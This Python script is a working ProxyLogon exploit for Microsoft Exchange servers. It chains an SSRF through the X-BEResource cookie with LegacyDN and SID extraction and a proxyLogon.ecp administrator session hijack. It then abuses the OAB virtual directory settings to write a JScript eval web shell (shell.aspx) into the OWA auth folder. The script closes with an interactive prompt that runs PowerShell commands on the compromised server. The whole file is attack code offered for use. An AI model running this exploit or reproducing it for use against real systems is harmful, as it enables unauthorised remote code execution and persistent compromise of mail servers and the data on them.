import requests
from urllib3.exceptions import InsecureRequestWarning
import random
import string
import sys
import os
import time
import webbrowser
print("""
  _____                     _                             
 |  __ \                   | |                            
 | |__) | __ _____  ___   _| |     ___   __ _  ___  _ __  
 |  ___/ '__/ _ \ \/ / | | | |    / _ \ / _` |/ _ \| '_ \ 
 | |   | | | (_) >  <| |_| | |___| (_) | (_| | (_) | | | |
 |_|   |_|  \___/_/\_ \__, |______\___/ \__, |\___/|_| |_|
                       __/ |             __/ |            
                      |___/             |___/                                                                     
                                                                                                                          
Original PoC by https://github.com/testanull
Author: @Haus3c                                                                                        
                                                                                                                                                             
  """)

def id_generator(size=6, chars=string.ascii_lowercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

if len(sys.argv) < 2:
	print("Usage: python proxylogon.py exchange.local user@lab.local")
	exit()
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
target = sys.argv[1]
email = sys.argv[2]
payload_name = "shell.aspx"
random_name = id_generator(3) + ".js"
user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
shell_path = "Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\%s" % payload_name
shell_absolute_path = "\\\\127.0.0.1\\c$\\%s" % shell_path

shell_content = '<script language="JScript" runat="server"> function Page_Load(){eval(Request["data"],"unsafe");}</script>'
legacyDnPatchByte = "68747470733a2f2f696d6775722e636f6d2f612f7a54646e5378670a0a0a0a0a0a0a0a"
autoDiscoverBody = """<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
    <Request>
      <EMailAddress>%s</EMailAddress> <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
    </Request>
</Autodiscover>
""" % email

print("Target: " + target)
print("=============================")
print("[+] Attempting SSRF")
FQDN = "%s" % target
ct = requests.get("https://%s/ecp/%s" % (target, random_name), headers={"Cookie": "X-BEResource=localhost~1942062522",
                                                                        "User-Agent": user_agent},
                  verify=False)
if "X-CalculatedBETarget" in ct.headers and "X-FEServer" in ct.headers:
    FQDN = ct.headers["X-FEServer"]

ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
    "Cookie": "X-BEResource=%s/autodiscover/autodiscover.xml?a=~1942062522;" % FQDN,
    "Content-Type": "text/xml",
    "User-Agent": user_agent},
                   data=autoDiscoverBody,
                   verify=False
                   )
if ct.status_code != 200:
    print("Autodiscover Error!")
    exit()
if "<LegacyDN>" not in ct.content:
    print("Can not get LegacyDN!")
    exit()

legacyDn = ct.content.split("<LegacyDN>")[1].split("</LegacyDN>")[0]
print("DN: " + legacyDn)

mapi_body = legacyDn + "\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00"

ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
    "Cookie": "X-BEResource=Administrator@%s:444/mapi/emsmdb?MailboxId=c8c9275b-4f46-4d48-9096-f0ec2e4ac8eb@lab.local&a=~1942062522;" % FQDN,
    "Content-Type": "application/mapi-http",
    "X-Requesttype": "Connect",
    "X-Clientinfo": "{2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226}",
    "X-Clientapplication": "Outlook/15.0.4815.1002",
    "X-Requestid": "{C715155F-2BE8-44E0-BD34-2960067874C8}:2",
    "User-Agent": user_agent},
                   data=mapi_body,
                   verify=False
                   )
if ct.status_code != 200 or "act as owner of a UserMailbox" not in ct.content:
    print("Mapi Error!")
    exit()

sid = ct.content.split("with SID ")[1].split(" and MasterAccountSid")[0]
if sid.rsplit("-",1)[1] == '500':
  print("SID: " + sid)
if sid.rsplit("-",1)[1] != '500':
  print("Original SID: " + sid)
  sid = sid.rsplit("-",1)[0] + '-500'
  print("Corrected SID: " + sid)


print("[+] SSRF Successful!")
print("[+] Attempting Arbitrary File Write")
# proxyLogon_request = """<r at="Negotiate" ln="administrator"><s>%s</s></r>""" % sid

proxyLogon_request = """<r at="Negotiate" ln="john"><s>%s</s><s a="7" t="1">S-1-1-0</s><s a="7" t="1">S-1-5-2</s><s a="7" t="1">S-1-5-11</s><s a="7" t="1">S-1-5-15</s><s a="3221225479" t="1">S-1-5-5-0-6948923</s></r>
""" % sid

ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
    "Cookie": "X-BEResource=Administrator@%s:444/ecp/proxyLogon.ecp?a=~1942062522;" % FQDN,
    "msExchLogonAccount": "%s" % sid,
    "msExchLogonMailbox": "%s" % sid,
    "msExchTargetMailbox": "%s" % sid,
    "Content-Type": "text/xml",
    "User-Agent": user_agent
},
                   data=proxyLogon_request,
                   verify=False
                   )
#print(ct.status_code)
if ct.status_code != 241 or not "set-cookie" in ct.headers:
    print("[-] Proxylogon Error!")
    exit()

sess_id = ct.headers['set-cookie'].split("ASP.NET_SessionId=")[1].split(";")[0]
msExchEcpCanary = ct.headers['set-cookie'].split("msExchEcpCanary=")[1].split(";")[0]
print("SessionID: " + sess_id)
print("CanaryToken: " + msExchEcpCanary)

ct = requests.get("https://%s/ecp/%s" % (target, random_name), headers={
    "Cookie": "X-BEResource=Admin@%s:444/ecp/about.aspx?a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s" % (
        FQDN, sess_id, msExchEcpCanary),
    "msExchLogonAccount": "%s" % sid,
    "msExchLogonMailbox": "%s" % sid,
    "msExchTargetMailbox": "%s" % sid,  
    "User-Agent": user_agent
},
                  verify=False
                  )
if ct.status_code != 200:
    print("[+] Wrong canary!")
    print("[+] Sometime we can skip this ...")
rbacRole = ct.content.split("RBAC roles:</span> <span class='diagTxt'>")[1].split("</span>")[0]

ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
    "Cookie": "X-BEResource=Admin@%s:444/ecp/DDI/DDIService.svc/GetObject?schema=OABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s" % (
        FQDN, msExchEcpCanary, sess_id, msExchEcpCanary),
    "Content-Type": "application/json; charset=utf-8",
    "msExchLogonAccount": "%s" % sid,
    "msExchLogonMailbox": "%s" % sid,
    "msExchTargetMailbox": "%s" % sid,  
    "User-Agent": user_agent

},
                   json={"filter": {
                       "Parameters": {"__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                                      "SelectedView": "", "SelectedVDirType": "All"}}, "sort": {}},
                   verify=False
                   )
if ct.status_code != 200:
    print("[-] GetOAB Error!")
    exit()
oabId = ct.content.split('"RawIdentity":"')[1].split('"')[0]
print("OABId: " + oabId)

oab_json = {"identity": {"__type": "Identity:ECP", "DisplayName": "OAB (Default Web Site)", "RawIdentity": oabId},
            "properties": {
                "Parameters": {"__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                               "ExternalUrl": "https://ffff/#%s" % shell_content}}}

ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
    "Cookie": "X-BEResource=Admin@%s:444/ecp/DDI/DDIService.svc/SetObject?schema=OABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s" % (
        FQDN, msExchEcpCanary, sess_id, msExchEcpCanary),
    "Content-Type": "application/json; charset=utf-8",
    "msExchLogonAccount": "%s" % sid,
    "msExchLogonMailbox": "%s" % sid,
    "msExchTargetMailbox": "%s" % sid,  
    "User-Agent": user_agent
},
                   json=oab_json,
                   verify=False
                   )
if ct.status_code != 200:
    print("[-] Set external url Error!")
    exit()

reset_oab_body = {"identity": {"__type": "Identity:ECP", "DisplayName": "OAB (Default Web Site)", "RawIdentity": oabId},
                  "properties": {
                      "Parameters": {"__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                                     "FilePathName": shell_absolute_path}}}

ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
    "Cookie": "X-BEResource=Admin@%s:444/ecp/DDI/DDIService.svc/SetObject?schema=ResetOABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s" % (
        FQDN, msExchEcpCanary, sess_id, msExchEcpCanary),
    "Content-Type": "application/json; charset=utf-8",
    "msExchLogonAccount": "%s" % sid,
    "msExchLogonMailbox": "%s" % sid,
    "msExchTargetMailbox": "%s" % sid,  
    "User-Agent": user_agent
},
                   json=reset_oab_body,
                   verify=False
                   )

if ct.status_code != 200:
    print("[-] Error writing the shell. Status code returned " + ct.status_code)
    exit()

print("[+] Success! Entering webshell. Type 'quit' or 'exit' to escape.\n")

cmd = "a"
while not cmd == "exit" or cmd == "quit":
  cmd = raw_input("# ")
  if cmd == "exit" or cmd == "quit":
    exit(0)
  command = requests.post("https://%s/owa/auth/%s" % (target, payload_name), headers={
        "Host": "%s" % FQDN,
        "User-Agent": user_agent,
        "Content-Type": "application/x-www-form-urlencoded",
        "Upgrade-Insecure-Requests": "1"
  },
          data= """data=Response.Write(new ActiveXObject("WScript.Shell").exec("powershell.exe -command  %s").stdout.readall());""" % cmd,
          verify=False
          )
  if command.status_code != 200:
    print("[-] Error running command. Status code %s") % command.status_code
    if command.status_code == 500:
      print("[-] Maybe AV is killing it?")
    exit()
  output = command.content.split('Name                            :')[0] 
  print(output)